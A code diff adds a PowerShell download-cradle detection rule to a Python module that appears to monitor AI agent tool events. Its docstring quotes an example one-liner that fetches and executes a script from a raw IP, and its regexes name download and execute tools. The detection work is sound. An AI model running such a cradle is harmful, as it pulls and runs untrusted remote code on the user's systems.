@@ -10,9 +10,20 @@ Add a rule by writing a function and appending it to REGISTRY.
 
 from __future__ import annotations
 
+import re
 from typing import Any
 
 from .models import Detection
+
+# A raw-IP URL and a download/execute verb in the same command is a classic
+# malware download cradle. Legit tooling uses domains and package managers.
+_RAW_IP_URL = re.compile(r"https?://(?:\d{1,3}\.){3}\d{1,3}")
+_DOWNLOAD_EXEC = re.compile(
+    r"downloadstring|downloadfile|invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b|"
+    r"certutil|bitsadmin|invoke-expression|\biex\b",
+    re.IGNORECASE,
+)
+_ENCODED_CMD = re.compile(r"-enc(odedcommand)?\b|frombase64string", re.IGNORECASE)
 
 # --- safe accessors ----------------------------------------------------------
 # Events are plain dicts read from JSONL; never assume a nested key exists.
@@ -56,6 +67,11 @@ def _outcome(event: dict[str, Any]) -> str:
 def _tool_qualified(event: dict[str, Any]) -> str:
     tool = event.get("tool")
     return str(tool.get("qualified") or "") if isinstance(tool, dict) else ""
+
+
+def _command(event: dict[str, Any]) -> str:
+    tool = event.get("tool")
+    return str(tool.get("command") or "") if isinstance(tool, dict) else ""
 
 
 def _event_id(event: dict[str, Any]) -> str:
@@ -244,9 +260,50 @@ def rule_approval_denied_then_executed(events: list[dict[str, Any]]) -> list[Det
     return detections
 
 
+def rule_encoded_command_download(events: list[dict[str, Any]]) -> list[Detection]:
+    """A command pulls a payload from a raw IP, often via an obfuscated one-liner.
+
+    `powershell -EncodedCommand ...` or `IEX (New-Object Net.WebClient).
+    DownloadString('http://185.220.101.5/a.ps1')` is a textbook download cradle:
+    fetch and execute code from a bare IP address, no domain, no package manager.
+    Critical, and it fires on a single event because the command itself is the
+    tell.
+    """
+    for event in events:
+        cmd = _command(event)
+        if not cmd:
+            continue
+        if _RAW_IP_URL.search(cmd) and _DOWNLOAD_EXEC.search(cmd):
+            encoded = bool(_ENCODED_CMD.search(cmd))
+            techniques = ["T1105", "T1059.001"]  # Ingress Tool Transfer, PowerShell
+            if encoded:
+                techniques.append("T1027")  # Obfuscated Files or Information
+            return [
+                Detection(
+                    rule_id="encoded-command-download",
+                    title="Payload download from a raw IP",
+                    severity="critical",
+                    summary=(
+                        f"{_tool_qualified(event) or 'A command'} fetched and executed content "
+                        "from a raw IP address"
+                        + (" via an encoded command" if encoded else "")
+                        + ". A classic download cradle."
+                    ),
+                    correlation_id=_correlation_id(events),
+                    tactic_ids=["TA0011", "TA0002"],
+                    technique_ids=techniques,
+                    event_ids=[_event_id(event)],
+                    first_seen_utc=_ts(event),
+                    last_seen_utc=_ts(event),
+                )
+            ]
+    return []
+
+
 REGISTRY = [
     rule_credential_exfil,
     rule_autonomous_unapproved_write,
     rule_discovery_then_collect,
     rule_approval_denied_then_executed,
+    rule_encoded_command_download,
 ]
